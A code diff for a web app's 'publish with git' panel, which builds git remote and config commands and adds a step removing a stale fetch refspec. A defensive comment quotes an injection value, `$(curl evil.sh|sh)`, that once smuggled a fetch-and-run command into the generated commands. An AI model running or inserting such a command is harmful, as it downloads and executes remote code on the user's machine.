@@ -90,6 +90,11 @@ export function KeyBackupDownload({ label = 'Download backup' }: { label?: strin
  * from then on, which serves no fetches: every `git pull` fails, a project's own remote set aside. `skipFetchAll` leaves
  * it out of `git fetch --all` and `git remote update`.
  *
+ * `git remote add` also writes a fetch refspec, which the directory has no use for and which did harm: with it, each
+ * push leaves `refs/remotes/softn/main` behind, and `git push --force-with-lease softn` compares that with what the
+ * directory offers, which is nothing, and refuses every push after the first as "stale info". The second line takes the
+ * refspec away. Every line runs as it is in Command Prompt, PowerShell and a POSIX shell.
+ *
  * These get pasted into a shell, so nothing goes in but what the directory itself allows as a name (Catalog::validSlug),
  * and anything else gives no commands. The directory answers loose spellings of a name, so a value from an address is
  * not one: `?update=$(curl evil.sh|sh)` opened a real app's page and put that in the commands.
@@ -99,6 +104,7 @@ export function gitCommands(slug: string, origin: string): string {
   const site = new URL(origin);
   return [
     `git remote add softn ${site.protocol}//${slug}@${site.host}/api/git/${slug}.git`,
+    'git config --unset remote.softn.fetch',
     'git config remote.softn.push HEAD:refs/heads/main',
     'git config remote.softn.skipFetchAll true',
     'git config http.postBuffer 64M',
@@ -115,9 +121,10 @@ export function PushWithGit({ slug }: { slug: string }): React.ReactElement | nu
     <section className="git-push">
       <h3 className="side-title">Publish new versions with git</h3>
       <p className="muted">
-        Run these once in the app’s git repository, with its <code>manifest.json</code> at the top. From then on,{' '}
+        Run the first five once in the app’s git repository, with its <code>manifest.json</code> at the top. From then on,{' '}
         <code>git push softn</code> publishes the commit you are on, from any branch. When git asks for a password, give it
-        the edit key. Where git keeps passwords, it keeps this app’s under the app’s name.
+        the edit key. Where git keeps passwords, it keeps this app’s under the app’s name. A push of the files the latest
+        version already has publishes nothing new.
       </p>
       <pre className="source-code">
         <code>{commands}</code>
@@ -134,7 +141,8 @@ export function PushWithGit({ slug }: { slug: string }): React.ReactElement | nu
       </button>
       <p className="muted">
         Each push to <code>main</code> is a new version, made of the files in that commit. Earlier commits are not kept, and an app
-        keeps its first version and its latest ones. Everything in the commit is public, so keep keys and passwords out of it.
+        keeps its first version and its latest ones. Everything in the commit is public, so keep keys and passwords out of it, and
+        save the key backup file somewhere outside the project. A push that holds this app’s key or a backup of keys is refused.
       </p>
     </section>
   );
